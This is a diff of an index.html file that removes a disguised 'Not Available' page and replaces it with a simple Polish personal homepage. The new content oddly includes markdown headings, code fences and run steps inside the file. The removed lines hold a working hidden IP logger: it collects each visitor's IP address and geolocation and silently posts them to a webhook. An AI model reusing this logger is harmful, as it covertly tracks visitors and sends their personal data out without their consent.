@@ -1,79 +1,161 @@
+# index.html
+
+```html
 <!DOCTYPE html>
-<html lang="en">
-  <head>
+<html lang="pl">
+<head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not Available</title>
-    <!-- CSS -->
-    <link rel="stylesheet" href="src/css/main.min.css">
-    <!-- Fontawesome -->
-    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
-    <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
-    <!-- Leaflet -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
-    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
-    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
-    <!-- Notyf CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
-  </head>
-  <body>
-    <header class="header"></header>
-    <script src="./config.js"></script>
-    <script>
-      function get_information(link, callback) {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", link, true);
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            callback(xhr.responseText);
-          }
-        };
-        xhr.send(null);
-      }
-      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "razzylog";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
-      get_information("https://api.ipify.org/", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "ipppp";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
+    <title>Moja Strona HTML</title>
 
-      function ipLogByRaz() {
-        var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
-        const request = new XMLHttpRequest();
-        request.open("POST", wbhk);
-        request.setRequestHeader('Content-type', 'application/json');
-        const params = {
-          username: "Beamed",
-          avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
-        }
-        request.send(JSON.stringify(params));
-      }
-      setTimeout(function() {
-        ipLogByRaz()
-      }, 700);
-    </script>
     <style>
-      .header {
-        display: none
-      }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-      .map-container {
-        display: none
-      }
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e3a8a);
+            color: white;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 40px;
+            text-align: center;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid rgba(255,255,255,0.2);
+        }
+
+        header h1 {
+            font-size: 3rem;
+            color: white;
+        }
+
+        header p {
+            margin-top: 10px;
+            color: #dbeafe;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1100px;
+            margin: 50px auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 30px;
+            transition: 0.3s ease;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            background: rgba(255,255,255,0.12);
+        }
+
+        .card h2 {
+            margin-bottom: 15px;
+            color: #93c5fd;
+        }
+
+        .skills {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .skill {
+            background: #2563eb;
+            padding: 10px 15px;
+            border-radius: 999px;
+            font-size: 14px;
+        }
+
+        .btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 25px;
+            background: white;
+            color: #1e3a8a;
+            text-decoration: none;
+            border-radius: 12px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: #93c5fd;
+            color: white;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 50px;
+            color: #cbd5e1;
+        }
     </style>
-  </body>
+</head>
+<body>
+
+<header>
+    <h1>Jestem Kapiczek</h1>
+    <p>Siemka!</p>
+</header>
+
+<section class="container">
+
+    <div class="card">
+        <h2>O mnie</h2>
+        <p>
+            Interesuję się technologią, muzyką, grami i tworzeniem stron internetowych.
+            Lubię nowoczesny design i kreatywne projekty.
+        </p>
+    </div>
+
+    <div class="card">
+        <h2>Moje umiejętności</h2>
+        <div class="skills">
+            <div class="skill">HTML</div>
+            <div class="skill">CSS</div>
+            <div class="skill">JavaScript</div>
+            <div class="skill">Gaming</div>
+            <div class="skill">Design</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>Kontakt</h2>
+        <p>
+            Możesz napisać do mnie na Discordzie
+        </p>
+
+        <a href="#" class="btn">Napisz do mnie</a>
+    </div>
+
+</section>
+
+<footer>
+    © 2026 | KapiczeK
+</footer>
+
+</body>
 </html>
+```
+
+## Jak uruchomić?
+
+1. Skopiuj kod.
+2. Zapisz plik jako `index.html`.
+3. Otwórz go w przeglądarce.
